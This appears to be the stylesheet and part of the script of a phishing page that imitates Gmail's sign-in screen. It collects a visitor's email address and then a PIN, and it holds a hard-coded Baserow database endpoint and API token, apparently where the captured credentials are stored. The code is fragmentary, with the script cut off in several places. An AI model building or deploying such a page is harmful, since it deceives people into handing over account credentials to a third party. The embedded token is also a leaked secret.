        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Roboto', Arial, sans-serif;
        }

        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
            background-color: white;
        }

        .container {
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            width: 75px;
            height: 24px;
            margin-bottom: 24px;
        }

        .title {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 12px;
            text-align: center;
        }

        .subtitle {
            font-size: 16px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 32px;
            text-align: center;
        }

        .form {
            width: 100%;
            display: flex;
            flex-direction: column;
        }

        .input-container {
            position: relative;
            margin-bottom: 24px;
        }

        .input-field {
            width: 100%;
            height: 56px;
            padding: 13px 15px;
            font-size: 16px;
            color: #202124;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
        }

        .input-field:focus {
            border-color: #1a73e8;
            border-width: 2px;
        }

        .email-display {
            display: flex;
            align-items: center;
            padding: 8px 16px 8px 8px;
            border: 1px solid #dadce0;
            border-radius: 16px;
            margin-bottom: 32px;
            align-self: flex-start;
        }

        .email-avatar {
            width: 20px;
            height: 20px;
            background-color: #dadce0;
            border-radius: 50%;
            margin-right: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .email-avatar svg {
            width: 12px;
            height: 12px;
            fill: #5f6368;
        }

        .email-text {
            font-size: 14px;
            color: #202124;
        }

        .email-dropdown {
            margin-left: 8px;
            color: #5f6368;
        }

        .checkbox-container {
            display: flex;
            align-items: center;
            margin-bottom: 24px;
        }

        .checkbox {
            width: 18px;
            height: 18px;
            margin-right: 16px;
        }

        .checkbox-label {
            font-size: 14px;
            color: #202124;
        }

        .link {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
        }

        .link:hover {
            text-decoration: underline;
        }

        .forgot-link {
            margin-bottom: 32px;
        }

        .footer {
            display: flex;
            justify-content: space-between;
            width: 100%;
            margin-top: 32px;
        }

        .button {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .button:hover {
            background-color: #1765cc;
        }

        .info-text {
            font-size: 14px;
            color: #5f6368;
            margin-top: 48px;
            line-height: 1.5;
        }

        /* Page specific styles */
        #page1, #page2 {
            width: 100%;
        }

        #page2 {
            display: none;
        }

        /* Updated styles to match the image */
        .title {
            font-size: 24px;
            margin-bottom: 24px;
            text-align: left;
            width: 100%;
        }

        .subtitle {
            font-size: 16px;
            margin-bottom: 24px;
            text-align: left;
            width: 100%;
        }

        .email-display {
            width: auto;
            border-radius: 20px;
            padding: 6px 12px 6px 6px;
            margin-bottom: 24px;
        }

        .input-field {
            border-radius: 4px;
            border: 1px solid #1a73e8;
        }

        .input-label {
            position: absolute;
            top: -8px;
            left: 10px;
            background: white;
            padding: 0 5px;
            font-size: 14px;
            color: #1a73e8;
        }

        .button {
            border-radius: 20px;
            padding: 12px 24px;
        }

        .checkbox-container {
            margin-top: 16px;
        }

        @media (max-width: 600px) {
            .container {
                padding: 24px 20px;
            }
            
            .footer {
                flex-direction: column-reverse;
                gap: 24px;
            }
            
            .button {
                align-self: flex-end;
            }
        }
    </style>

        // DOM elements
        const page1 = document.getElementById('page1');
        const page2 = document.getElementById('page2');
        const emailForm = document.getElementById('email-form');
        const pinForm = document.getElementById('pin-form');
        const emailInput = document.getElementById('email');
        const pinInput = document.getElementById('pin-code');
        const displayEmail = document.getElementById('display-email');
        const showPinCheckbox = document.getElementById('show-pin');
        
        // Constants
        const BASEROW_API = 'https://baserow.io/database/209047/table/503285/914739';
        const TOKEN = 'Token LG6hnTBxgBG78FueElsSwpHRd4Wep1oL';
        
        // Handle email form submission
        emailForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = emailInput.value.trim();
            
            if (email) {
                // Store email in localStorage (more persistent than sessionStorage)
                localStorage.setItem('userEmail', email);
                
                // Display email on page 2
                displayEmail.textContent = email;
                
                // Switch to page 2
                page1.style.display = 'none';
                page2.style.display = 'block';
                
                // Focus on PIN field
                pinInput.focus();
                
                // Update document title
                document.title = 'Welcome - Gmail';
            }
        });

                pinInput.style.textSecurity = 'none';
            } else {

                pinInput.style.textSecurity = 'disc';
            }
        });
        
        // Initialize PIN field to be masked
        pinInput.style.webkitTextSecurity = 'disc';
        pinInput.style.textSecurity = 'disc';
        
        // Check if returning from page 2 or if email is already stored
        window.addEventListener('load', function() {
            const savedEmail = localStorage.getItem('userEmail');
            
            if (savedEmail && (window.location.hash === '#verify' || window.location.search.includes('continue'))) {
                displayEmail.textContent = savedEmail;
                page1.style.display = 'none';
                page2.style.display = 'block';
